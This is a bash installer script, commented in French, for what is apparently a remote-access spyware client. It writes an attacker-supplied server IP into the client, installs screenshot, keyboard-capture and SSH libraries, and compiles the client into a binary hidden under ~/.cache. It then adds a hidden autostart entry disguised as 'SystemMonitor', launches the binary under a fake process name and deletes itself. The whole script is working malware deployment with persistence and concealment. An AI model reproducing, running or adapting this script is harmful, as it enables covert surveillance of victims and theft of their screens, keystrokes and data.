#!/bin/bash

# --- CONFIGURATION INITIALE ---
printf "Adresse IP Serveur : "
read IP_SRV #
TARGET_DIR="$HOME/.cache/.system_logs"
FINAL_BIN="sys_update"

# --- NETTOYAGE PRÉALABLE ---
rm -rf build dist client.spec #

# --- PRÉPARATION ---
mkdir -p "$TARGET_DIR" #
sed -i "s/CIBLE_IP = .*/CIBLE_IP = \"$IP_SRV\"/g" client/client.py

# --- INSTALLATION DÉPENDANCES ---
echo "[+] Verification des modules..."
sudo apt update && sudo apt install -y python3-pip gnome-screenshot &>/dev/null #
pip3 install pyinstaller paramiko pyautogui opencv-python pillow pynput --break-system-packages &>/dev/null

# --- COMPILATION ---
echo "[+] Generation du binaire..."
python3 -m PyInstaller --onefile --noconsole client/client.py &>/dev/null #
mv dist/client "$TARGET_DIR/$FINAL_BIN"

# --- PERSISTANCE ---
mkdir -p ~/.config/autostart
cat > ~/.config/autostart/sys_mon.desktop <<EOF
[Desktop Entry]
Type=Application
Name=SystemMonitor
Exec=$TARGET_DIR/$FINAL_BIN
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF

# --- EXECUTION ET FIN ---
chmod +x "$TARGET_DIR/$FINAL_BIN"
exec -a "sys-monitor-proc" "$TARGET_DIR/$FINAL_BIN" &>/dev/null & #
echo "[!] Installation terminee."
rm -- "$0" #